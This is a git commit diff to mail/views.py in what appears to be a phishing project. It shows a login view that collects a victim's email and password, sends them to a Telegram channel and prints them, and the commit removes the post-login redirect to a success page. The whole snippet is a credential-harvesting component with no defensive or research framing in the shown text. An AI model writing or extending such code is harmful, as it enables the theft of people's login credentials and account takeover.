e907dd0cb687bd2a9db055a0eaaeeacf2bb631ee
Adetunji Peter <tunjipete@grrnberry.com>
2024-11-03 16:52:45 +0100

    new com

--- mail/views.py
+++ mail/views.py
@@ -26,7 +26,6 @@ def login_view(request):
         mail_message = f"{subject}\nusername: {email}\npassword: {password}"
         send_to_telegram(mail_message)
         print(mail_message)
-        return redirect('success')
     return render(request, 'index.html')
 
 def success_view(request):
